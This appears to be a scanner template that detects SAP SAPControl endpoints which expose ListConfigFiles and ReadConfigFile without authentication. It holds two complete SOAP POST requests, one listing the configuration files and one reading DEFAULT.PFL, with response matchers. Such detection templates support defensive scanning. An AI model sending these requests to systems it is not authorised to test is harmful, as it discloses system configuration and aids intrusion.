id: sap-readconfig-disclosure
brief:
    title: SAPControl Read DEFAULT.PFL - Disclosure
    by: LRVT
    level: medium
    about: Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the ReadConfigFile web method in combination with an unprotected ListConfigFiles call, allowing unau...
    label:
        - sap
        - sapcontrol
        - soap
        - config
        - disclosure
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/'
      head:
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: '''""'''
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:ListConfigFiles xmlns:ns1="urn:SAPControl"/>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
      signs:
        - "on": word
          has:
            - ListConfigFilesResponse
            - <configfiles>
          in: body
          need: all
    - verb: POST
      to:
        - '{{BaseURL}}/'
      head:
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: '''""'''
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:ReadConfigFile xmlns:ns1="urn:SAPControl">
              <filename>{{default_pfl}}</filename>
            </ns1:ReadConfigFile>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
      signs:
        - "on": word
          has:
            - ReadConfigFileResponse
            - <lines>
          in: body
          need: all
        - "on": status
          status:
            - 200
